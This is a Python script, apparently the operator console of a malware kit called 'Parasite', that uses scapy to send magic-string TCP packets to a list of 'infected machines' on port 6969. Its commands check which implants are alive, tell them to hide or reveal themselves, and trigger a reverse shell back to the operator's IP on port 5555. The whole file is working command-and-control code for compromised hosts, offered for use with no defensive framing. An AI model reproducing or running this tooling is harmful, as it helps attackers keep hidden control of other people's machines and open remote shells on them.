from scapy.all import *
import sys
import socket

RED = "\033[1;31m"
MAGENTA = "\033[1;35m"
GREEN = "\033[1;32m"
BLUE = "\033[1;34m"
cRESET  = "\033[0m"
prompt = GREEN + "(scraper.py)" + BLUE + "::> " + cRESET

art = """
 ______   ______     ______     ______     ______     __     ______   ______    
/\  == \ /\  __ \   /\  == \   /\  __ \   /\  ___\   /\ \   /\__  _\ /\  ___\   
\ \  _-/ \ \  __ \  \ \  __<   \ \  __ \  \ \___  \  \ \ \  \/_/\ \/ \ \  __\   
 \ \_\    \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \/\_____\  \ \_\    \ \_\  \ \_____\ 
  \/_/     \/_/\/_/   \/_/ /_/   \/_/\/_/   \/_____/   \/_/     \/_/   \/_____/ 
                                                                                
"""

help = """\n
[+] ls: List infected machines\n
[+] reload: Heartbeats all scope machines to refresh ls\n
[+] showall: Sends PARASITE_SHOW to all active machines\n
[+] hideall: Sends PARASITE_HIDE to all active machines\n
[+] rshell targetip: Send rshell command to targetip, must be listening for 5555 already\n
[+] exit: Exit program\n
"""

def read_scope(file):
    lines = []
    with open(file, 'r') as f:
        for line in f:
            lines.append(line.strip())
        f.close()
    return lines


def print_scope(active, inactive):
    print(prompt + MAGENTA + "Printing out scope status!\n")
    [print(RED + "[-] " + j) for j in inactive]
    [print(GREEN + "[+] " + i) for i in active]
    print('\n')


def hide_all(scope):
    for i in scope:
        pkt = IP(dst=i)/TCP(dport=6969)/Raw(load='PARASITE_HIDE')
        resp = sr1(pkt, timeout=1)
        if resp == None:
            print("Successful hiding of machine: " + str(i))
            continue
        print("Unsuccessful hiding of machine: " + str(i))


def show_all(scope):
    for i in scope:
        pkt = IP(dst=i)/TCP(dport=6969)/Raw(load='PARASITE_SHOW')
        resp = sr1(pkt, timeout=1)
        if resp == None:
            print("Successful reveal of machine: " + str(i))
            continue
        print("Unsuccessful reveal of machine: " + str(i))


def heartbeat(scope):
    active = []
    inactive = []
    for i in scope:
        pkt = IP(dst=i)/TCP(dport=6969)/Raw(load='PARASITE_HB')
        resp = sr1(pkt, timeout=0.5)
        if resp == None:
            active.append(i)
            continue
        inactive.append(i)

    return active, inactive


def send_rshell(myip, ip):
    pkt = IP(dst=ip)/TCP(dport=6969)/Raw(load='PARASITE_RSHELL' + str(myip))
    resp = sr1(pkt, timeout=0.5)
    if resp == None:
        print("rshell packet sent to " + str(ip) + "!\n")
    else:
        print("rshell shit for " + str(ip))
        

def main():
    if len(sys.argv) != 2:
        print(prompt + RED + "Invalid arguments! Must do python3 opeartor.py <scope.txt>" + cRESET)
        sys.exit()

    print(MAGENTA + art + "\n" + prompt + "Welcome to Parasite!\n")
    scope = read_scope(sys.argv[1])
    curr_active, curr_inactive = heartbeat(scope)
    print_scope(curr_active, curr_inactive)

    # Commands
    while True:
        cmd = input(prompt)
        if cmd == "help":
            print(help)
        if cmd == "exit":
            sys.exit()
        if cmd == "showall":
            show_all(scope)
        if cmd == "hideall":
            hide_all(scope)
        if cmd == "ls":
            print_scope(curr_active, curr_inactive)
        if cmd == "reload":
            curr_active, curr_inactive = heartbeat(scope)
        if cmd.split()[0] == "rshell":
            send_rshell(socket.gethostbyname(socket.gethostname()), cmd.split()[1])


if __name__ == "__main__":
    main()